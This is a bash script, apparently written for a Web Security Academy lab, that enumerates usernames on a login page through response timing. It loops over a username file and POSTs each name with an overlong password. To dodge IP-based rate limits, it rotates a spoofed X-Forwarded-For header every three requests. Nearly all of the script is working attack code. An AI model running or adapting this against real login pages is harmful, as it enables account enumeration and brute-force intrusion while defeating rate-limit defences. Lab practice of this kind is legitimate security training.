#!/bin/bash

# validate URL : perform curl, 0 or 1 should be captured

# . ./passwordsearch.sh
. ./spoofIP.sh


# https://0aa700c704519df581fcd5f9005800bb.web-security-academy.net/login

function validateURL() {
    # need to segregate parts of URL
    local URL=$1
    # local proto=${URL#*/}
    # local lastdomain=${URL#*//}
    local pattern='^(https?):\/\/([a-zA-Z-0-9\_\-]+\.)+(net\/login)$'
    # local pattern='^(https?|ftp)://([a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)+([/?].*)?$'
    if [[ $URL =~ $pattern ]]
    then
        echo 1
    else
        echo 0
    fi
}

if [ $# -ne 1 ]
then
#     validURL=$(validateURL $1)

#     if [ $validURL == 0 ]
#     then
#         echo "Invalid URL"
#         exit
#     fi
# else
    echo "wrong number of arguments"
    exit
fi

echo "starting usersearch"

# need to check for response timings
# Need to add X-forwarded-for header in the request.

exec 3<&0
exec 0<./username.txt

# curl -d "username=$user&password=admin" -H "X-Forwarded-For: $IP" -X POST --cookie "session=BjZkrM4PXWDoIbXAQ4fFxGfFqApEYUJj" -w %{time_total}s
session='X8A9Q2In13NfEvKMhIVieuLe95ACbZP6'
URL=$1
IPusagecount=0
IP=$(newIP)
password="ljdlsijlsdjljsdthis issi smyuonly passw3ord I swrewatr this is the only password the lengtheirer the betere the passwordheheIamusingspeacinginpasswords"

while read user
do
    # make a request using curl ?
    out=$(curl -X POST -d "username=$user&password=$password" -H "X-Forwarded-For: $IP" --cookie "session=$session" -w "$user %{time_total}s" $URL -s -o /dev/null)
    IPusagecount=$[$IPusagecount+1]
    if [ $IPusagecount == 3 ]
    then    
        IPusagecount=0
        IP=$(newIP)
    fi
    echo $out
done
exec 0<&3
